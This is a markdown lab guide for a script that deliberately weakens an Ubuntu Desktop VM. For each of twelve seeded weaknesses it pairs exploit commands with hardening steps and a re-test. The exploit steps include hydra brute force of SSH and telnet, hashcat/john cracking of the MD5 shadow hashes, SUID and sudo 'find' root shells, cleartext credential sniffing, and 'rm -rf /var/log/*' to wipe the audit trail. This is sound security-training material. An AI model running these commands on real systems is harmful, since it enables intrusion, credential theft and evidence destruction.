# 🐧 Ubuntu Desktop — deharden → exploit → harden

This guide walks through the Ubuntu dehardening script. For **every** weakness it introduces you get
the same four things, so each exercise is fully reproducible:

- 🧪 **Seeded by the script** — the exact artifact you can test (a user, a file mode, a setting).
- 🟠 **Exploit** — concrete commands *and the result you should see*.
- 🟢 **Harden** — the fix.
- ✅ **Re-test** — run the same attack again and confirm it now fails.

- **Script:** [`scripts/ubuntu/deharden-ubuntu.sh`](../scripts/ubuntu/deharden-ubuntu.sh) (Bash)
- **Tested on:** Ubuntu Desktop 24.04 and 22.04
- **New to the lab?** Read [lab-setup.md](lab-setup.md) first.

> [!WARNING]
> This script weakens the machine on purpose. Run it **only** in an isolated lab VM (Host-Only
> network) with a **fresh snapshot**. To recover a safe state, restore the snapshot.

## How to run the script

```bash
chmod +x deharden-ubuntu.sh
sudo ./deharden-ubuntu.sh          # type DEHARDEN to confirm
# sudo ./deharden-ubuntu.sh -y --no-apt   # unattended, and skip apt installs (offline VM)
sudo reboot                        # so ASLR / AppArmor / services settle
```

- **Backups:** `/root/deharden-backups-<date>/` · **Log:** `/var/log/deharden-lab.log`
- **Demo accounts it creates:** `root / toor` and `trainee / 123456` — both are in `rockyou.txt`,
  so they are genuinely crackable, and their hashes are stored as **MD5 (`$1$…`)** on purpose.

## Attacker box prerequisites

The 🟠 commands run from the attacker VM (e.g. Kali). You'll need `nmap`, `hydra`, `john`, `hashcat`
and the wordlist:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz   # if it's still gzipped
export IP=192.168.56.20                              # <-- the victim's IP (ip a on the victim)
```

---

## 1. SSH wide open: root login, no retry limit, legacy crypto
- 🧪 **Seeded:** `sshd_config` sets `PermitRootLogin yes`, `PermitEmptyPasswords yes`,
  `MaxAuthTries 100`, and legacy `Ciphers/MACs/KexAlgorithms`; `root` has the password `toor`.
- 🟠 **Exploit:**
  ```bash
  nmap -p22 --script ssh2-enum-algos $IP        # lists the weak cbc / sha1 / group1 algos
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t4
  #  => [22][ssh] host: <IP>  login: root  password: toor
  ssh root@$IP                                   # you are now root
  ```
- 🟢 **Harden:** in `/etc/ssh/sshd_config` set `PermitRootLogin no`, `PermitEmptyPasswords no`,
  `MaxAuthTries 4`, `AllowGroups sshadmins`, plus modern `Ciphers`/`MACs`/`KexAlgorithms`; then
  `systemctl restart ssh`.
- ✅ **Re-test:** `ssh root@$IP` → *Permission denied*; the hydra run no longer finds root.

## 2. Weak passwords (`root/toor`, `trainee/123456`)
- 🧪 **Seeded:** both accounts exist with those exact weak passwords.
- 🟠 **Exploit:**
  ```bash
  printf 'root\ntrainee\n' > users.txt
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t4
  #  => finds root:toor and trainee:123456
  ```
- 🟢 **Harden:** set strong passwords (`passwd trainee`, `passwd root`) and enforce the policy in row 3.
- ✅ **Re-test:** the dictionary run exhausts `rockyou.txt` with no hit.

## 3. No complexity, no lockout (faillock), MD5 hashes
- 🧪 **Seeded:** `/etc/security/pwquality.conf` → `minlen=1`, no complexity; `pam_faillock` removed;
  `ENCRYPT_METHOD MD5` in `login.defs`; and the demo passwords are **re-hashed as MD5** so
  `/etc/shadow` really contains `$1$…` entries.
- 🟠 **Exploit (offline, pairs with row 6 — shadow is world-readable):**
  ```bash
  # on the victim (any user can read it) — copy the lines to the attacker box
  grep -E 'root|trainee' /etc/shadow > hashes.txt
  hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt     # -m 500 = md5crypt
  #  or:  john --format=md5crypt hashes.txt
  #  => recovers 'toor' and '123456' in seconds (MD5 is fast + no complexity required)
  ```
  Online, because `faillock` is gone, `hydra ssh://$IP` can try forever without locking anyone out.
- 🟢 **Harden:**
  - `/etc/security/pwquality.conf`: `minlen=14`, `minclass=4`
  - `/etc/pam.d/common-auth`: `auth requisite pam_faillock.so preauth deny=5 unlock_time=900`
  - `/etc/login.defs`: `ENCRYPT_METHOD SHA512`, then reset the passwords so new `$6$` hashes are stored
- ✅ **Re-test:** new hashes are `$6$` (SHA-512) and the strong passwords aren't in `rockyou.txt`, so
  hashcat/john exhaust the wordlist; online brute force locks out after 5 tries.

## 4. ASLR disabled
- 🧪 **Seeded:** `kernel.randomize_va_space = 0`.
- 🟠 **Exploit (prove it without writing an exploit):**
  ```bash
  cat /proc/sys/kernel/randomize_va_space          # => 0
  for i in 1 2 3; do awk '/libc/{print $1; exit}' /proc/self/maps; done
  #  => the libc base address is IDENTICAL every run -> memory layout is predictable,
  #     which is exactly what makes ret2libc / ROP exploitation reliable.
  ```
- 🟢 **Harden:** `sysctl -w kernel.randomize_va_space=2` and persist it in `/etc/sysctl.conf`.
- ✅ **Re-test:** the loop above now prints a **different** libc base each run.

## 5. AppArmor disabled (processes unconfined)
- 🧪 **Seeded:** the `apparmor` service is stopped and disabled; profiles set to `complain`.
- 🟠 **Exploit:**
  ```bash
  sudo aa-status        # => "0 profiles are in enforce mode" (nothing is confined)
  ```
  A compromised confined service (e.g. a web app) is no longer boxed in, so it can read `/etc/shadow`
  and pivot across the host.
- 🟢 **Harden:** `systemctl enable --now apparmor`; `aa-enforce /etc/apparmor.d/*`.
- ✅ **Re-test:** `sudo aa-status` now lists profiles in **enforce** mode.

## 6. `/etc/shadow` world-readable; SUID on `find` and `/tmp/rootbash`
- 🧪 **Seeded:** `chmod 644 /etc/shadow`; SUID bit on `/usr/bin/find`; a SUID copy at `/tmp/rootbash`.
- 🟠 **Exploit (as the low-priv `trainee`):**
  ```bash
  ls -l /etc/shadow                       # => -rw-r--r-- : readable by everyone (feeds row 3)
  find / -perm -4000 -type f 2>/dev/null  # => lists /usr/bin/find and /tmp/rootbash
  find . -exec /bin/sh -p \; -quit        # GTFOBins: drops a shell with euid=0
  id                                       # => uid=1001(trainee) euid=0(root)
  /tmp/rootbash -p                        # second vector: also euid=0
  ```
- 🟢 **Harden:** `chmod 640 /etc/shadow`; `chmod u-s /usr/bin/find`; `rm -f /tmp/rootbash`; audit the
  whole system with `find / -perm -4000 -type f 2>/dev/null`.
- ✅ **Re-test:** `cat /etc/shadow` as `trainee` → *Permission denied*; `find … -exec` keeps `trainee`'s uid.

## 7. Insecure sudo: `trainee` has NOPASSWD, no log, no pty
- 🧪 **Seeded:** `/etc/sudoers.d/90-lab-deharden` lets `trainee` run `find` as root with no password.
- 🟠 **Exploit (as `trainee`):**
  ```bash
  sudo -l                                  # => (ALL) NOPASSWD: /usr/bin/find
  sudo find . -exec /bin/sh \; -quit       # GTFOBins: root shell, no password asked
  id                                        # => uid=0(root)
  ```
- 🟢 **Harden:** remove the rule from `/etc/sudoers.d/`; with `visudo` set `Defaults use_pty`,
  `Defaults logfile="/var/log/sudo.log"`, `Defaults timestamp_timeout=15`.
- ✅ **Re-test:** `sudo find …` now prompts for a password and is logged in `/var/log/sudo.log`.

## 8. Extra services: telnet (cleartext), avahi, cups
- 🧪 **Seeded:** `telnetd` installed and active; `avahi-daemon` and `cups` enabled.
- 🟠 **Exploit:**
  ```bash
  nmap -sV $IP                             # => 23/tcp open telnet  (plus avahi/cups)
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://$IP
  sudo tcpdump -i any port 23 -A           # watch a telnet login -> credentials in cleartext
  ```
- 🟢 **Harden:** `apt purge -y telnetd`; `systemctl disable --now avahi-daemon cups`.
- ✅ **Re-test:** `nmap -sV $IP` no longer shows 23/tcp; nothing listens on the removed services.

## 9. Firewall disabled
- 🧪 **Seeded:** `ufw` disabled; `iptables` policies set to ACCEPT and flushed.
- 🟠 **Exploit:** `nmap -sS -p- $IP` → every listening port is reachable.
- 🟢 **Harden:** `ufw default deny incoming`; `ufw allow 22/tcp`; `ufw enable`.
- ✅ **Re-test:** `nmap -sS -p- $IP` now shows only the ports you explicitly allowed (e.g. 22).

## 10. Network forwarding and redirects enabled
- 🧪 **Seeded:** `net.ipv4.ip_forward=1`, `send_redirects=1`, `accept_redirects=1`.
- 🟠 **Exploit:**
  ```bash
  sysctl net.ipv4.ip_forward               # => 1 : the host can route/pivot traffic
  ```
  With a third host present, the victim can be used as a MITM relay (`arpspoof`, `ettercap`).
- 🟢 **Harden:** `sysctl -w net.ipv4.ip_forward=0` and `net.ipv4.conf.all.send_redirects=0`
  (persist in `/etc/sysctl.conf`).
- ✅ **Re-test:** `sysctl net.ipv4.ip_forward` → `0`.

## 11. Auditing and log forwarding disabled
- 🧪 **Seeded:** `auditd` stopped/disabled; any remote rsyslog forwarding moved aside.
- 🟠 **Exploit (after getting root):**
  ```bash
  systemctl is-active auditd               # => inactive : actions aren't recorded
  rm -rf /var/log/*                        # the trail is gone and nothing was shipped off-box
  ```
- 🟢 **Harden:** `systemctl enable --now auditd` with rules such as `-w /etc/sudoers -p wa -k scope`;
  forward logs to a remote collector via rsyslog.
- ✅ **Re-test:** `ausearch -k scope` shows events; deletions are mirrored on the remote collector.

## 12. Automatic updates disabled
- 🧪 **Seeded:** `unattended-upgrades` disabled; periodic update lists off.
- 🟠 **Exploit:**
  ```bash
  nmap -sV $IP                             # read a service + version
  searchsploit <service> <version>          # => known public exploits for the unpatched version
  ```
- 🟢 **Harden:** `apt update && apt upgrade`; re-enable `unattended-upgrades`.
- ✅ **Re-test:** the service version is current and `searchsploit` no longer maps to a usable exploit.

---

## Suggested loop

For each row: **exploit → harden → re-run the exact same attack and confirm it fails.** Restore the
`fresh` snapshot before the next session so you always start from a known state.

➡️ Next target: [Windows Server 2019 guide](windows-server-2019.md)
